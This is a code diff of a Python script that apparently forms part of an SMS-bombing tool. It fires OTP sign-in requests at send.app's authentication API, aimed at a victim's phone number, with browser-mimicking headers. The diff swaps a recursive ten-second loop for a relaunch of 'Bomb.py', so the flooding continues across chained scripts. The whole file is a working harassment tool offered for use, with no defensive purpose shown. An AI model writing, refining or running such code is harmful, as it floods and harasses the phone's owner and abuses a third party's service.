@@ -6,31 +6,11 @@ from time import sleep
 from rich.progress import track
 from rich.panel import Panel
 from number import nums
+from number import logo
 import re
-for i in track(range(20),description='Wait...'):
-	sleep(.1)
-	pass
-os.system('clear')
-print(Panel('''[green]===========
-<\>FlixAccounts.</>
-<\>
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡾⠃⠀⠀⠀⠀⠀⠀⠰⣶⡀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡿⠁⣴⠇⠀⠀⠀⠀⠸⣦⠈⢿⡄⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡇⢸⡏⢰⡇⠀⠀⢸⡆⢸⡆⢸⡇⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡇⠘⣧⡈⠃⢰⡆⠘⢁⣼⠁⣸⡇⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣄⠘⠃⠀⢸⡇⠀⠘⠁⣰⡟⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠃⠀⠀⢸⡇⠀⠀⠘⠋⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠃⠀⠀⠀⠀⠀⠀⠀
-<\>
-============
-BY : @anasxzer0
-			Loop By :@ue3ex
-'''))
-B=input('Country Code (Without (+)) : ')
-A=input('Enter the phone number (Without (0)) : ')
-
+print(logo)
+B=countrycode
+A=number
 url = "https://send.app/api/trpc/auth.signInWithOtp"
 params = {
 	'batch': "1"
@@ -60,15 +40,11 @@ headers = {
 	'accept-language': "ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7",
 	'priority': "u=1, i"
 	}
-def loop():
-	response = requests.post(url, params=params, data=payload, headers=headers).text
-	if re.search('data',str(response)):
-		print(Panel(f'GOOD Sended to {A} ',title='[green]GOOD'))
-		time.sleep(10)
-		loop()
-	else:
-		print(Panel(f'BAD Not sended to {A} ',title='[red]BAD '))
-		time.sleep(10)
-		loop()
-loop()
+response = requests.post(url, params=params, data=payload, headers=headers).text
+if re.search('data',str(response)):
+	print(Panel(f'GOOD Sended to {A} ',title='[green]GOOD'))
+	os.system('python Bomb.py')
+else:
+	print(Panel(f'BAD Not sended to {A} ',title='[red]BAD '))
+	os.system('python Bomb.py')
 		
